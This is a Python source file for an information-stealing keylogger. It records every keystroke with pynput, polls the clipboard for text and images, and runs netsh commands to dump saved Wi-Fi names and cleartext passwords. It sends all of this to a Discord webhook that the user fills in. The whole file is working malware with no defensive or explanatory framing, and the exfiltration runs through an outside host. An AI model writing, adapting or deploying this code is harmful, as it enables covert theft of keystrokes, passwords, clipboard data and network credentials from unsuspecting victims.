from pynput import keyboard
import threading, requests, pyperclip, subprocess
from PIL import ImageGrab
from io import BytesIO

info = ""
time_interval = 3
last_sent_info = ""
last_clip_text = ""
last_clip_image = None
stop_flag = False


webhook_url = "" # your discord webhook

def send_to_discord(content=None, image=None):
    
        if content:
            requests.post(webhook_url, json={"content": content})
        if image:
            img_bytes = BytesIO()
            image.save(img_bytes, format="PNG")
            img_bytes.seek(0)
            files = {"file": ("clipboard.png", img_bytes, "image/png")}
            requests.post(webhook_url, files=files)
    

def check_clipboard():
    global last_clip_text, last_clip_image
    if stop_flag:
        return

    # Get latest clipboard
    clip_text = pyperclip.paste()
    clip_image = ImageGrab.grabclipboard()

    # Send text if changed
    if clip_text and clip_text != last_clip_text:
        send_to_discord(content=clip_text)
        last_clip_text = clip_text

    # Send image if changed
    if clip_image and clip_image != last_clip_image:
        send_to_discord(image=clip_image)
        last_clip_image = clip_image

    threading.Timer(time_interval, check_clipboard).start()



def on_press(key):
    global info, stop_flag, last_sent_info
    
    # Only append if key has 'char' attribute
    if hasattr(key, "char") and key.char is not None:
        info += key.char
    else:
        # Handle special keys
        if key == keyboard.Key.space:
            info += " "
        elif key == keyboard.Key.enter:
            info += "\n"
        elif key == keyboard.Key.tab:
            info += "\t"
        elif key == keyboard.Key.backspace:
            info = info[:-1]
        elif key in (keyboard.Key.ctrl_l, keyboard.Key.ctrl_r,
                     keyboard.Key.shift_l, keyboard.Key.shift_r):
            pass
        elif key == keyboard.Key.f12:  # stop script
            stop_flag = True
            return False

    # Send key info if changed
    if info != last_sent_info:
        send_to_discord(content=info)
        last_sent_info = info

        
def extract_wifi_name_pass():
    payload1 = 'netsh wlan show profile'
    output1 = subprocess.getoutput(payload1)
    lines = output1.splitlines()
    
    for line in lines:
        line = line.strip()
        if line.startswith("All User Profile"):
            wifi_name = line.split(":")[1].strip()
            payload2 = f'netsh wlan show profile name="{wifi_name}" key=clear'
            output2 = subprocess.getoutput(payload2)
            password_lines = output2.splitlines()
            
            wifi_pass = "N/A"  # Default if no password found
            for passwd_line in password_lines:
                if passwd_line.strip().startswith("Key Content"):
                    wifi_pass = passwd_line.split(":")[1].strip()
                    
            
            # Send to Discord instead of printing
            send_to_discord(content=f"Wifi name: {wifi_name} --> password: {wifi_pass}")

                    
   

# Start listener
with keyboard.Listener(on_press=on_press) as listener:
    check_clipboard()
    extract_wifi_name_pass()
    listener.join()


